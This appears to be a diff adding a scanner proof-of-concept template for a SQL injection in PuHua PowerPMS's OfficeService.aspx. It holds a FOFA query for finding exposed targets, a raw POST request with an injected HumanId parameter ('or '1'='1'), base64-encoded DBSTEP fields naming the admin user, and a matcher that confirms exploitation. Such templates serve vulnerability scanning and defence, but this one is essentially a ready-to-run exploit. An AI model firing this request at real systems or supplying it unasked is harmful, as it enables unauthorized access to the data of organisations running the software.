@@ -1,0 +1,35 @@
+id: poc-yaml-powerpms-officeservice-aspx-sqli
+info:
+  name: 普华 PowerPMS OfficeService.aspx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: powerpms
+  fofa: body="Power.login.init" && body="Power.ui.warning" && body="Power_login_btn"
+variables:
+  random: random_int(100000,999999)
+requests:
+- raw: 'POST /PowerPlat/FormXml/DocFile/OfficeService.aspx?HumanId=1''or+''1''=''1
+    HTTP/1.1
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+
+    DBSTEP V3.0     135             0               8               DBSTEP=REJTVEVQ
+
+    OPTION=TE9BRE1BUktMSVNU
+
+    USERNAME=YWRtaW4=
+
+    TEMPLATE=dGVzdC50eHQ=
+
+    FILENAME=dGVzdC50eHQ=
+
+    RECORDID=dHh0
+
+    FILETYPE=dHh0
+
+    {{.random}}'
+  expression: status_code == 200 && contains(body,"DBSTEP V3.0") && contains(body,random)
+    && !contains(body,"<") && matches(body,"MARKLIST=[A-Za-z0-9+/]{20,}={0,2}")
+transport: http
